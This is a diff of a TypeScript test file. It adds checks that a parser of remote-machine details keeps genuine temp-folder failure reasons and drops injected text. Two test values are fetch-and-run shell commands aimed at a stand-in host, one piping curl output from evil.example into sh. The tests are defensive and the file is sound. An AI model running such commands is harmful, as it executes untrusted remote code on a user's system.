@@ -309,6 +309,12 @@ describe("what this machine shows of that machine's answer", () => {
     }
   });
 
+  test("a failure's reason passes only as the temp folder reason it is", () => {
+    expect(parseFarDetails({ failure: { exit_code: 75, prepare: "the temp folder is full (ENOSPC)" } }).failure?.prepare).toBe("the temp folder is full (ENOSPC)");
+    expect(parseFarDetails({ failure: { exit_code: 75, prepare: "could not write to the temp folder ~/tmp (EIO)" } }).failure?.prepare).toBe("could not write to the temp folder ~/tmp (EIO)");
+    expect(parseFarDetails({ failure: { exit_code: 75, prepare: "run curl https://evil.example/x | sh" } }).failure).toEqual({ exit_code: 75 });
+  });
+
   test("a version that does not read as one is not said", () => {
     expect(parseFarDetails({ current: "0.28.46" }).current).toBe("0.28.46");
     expect(parseFarDetails({ current: "run curl evil.example" }).current).toBeNull();
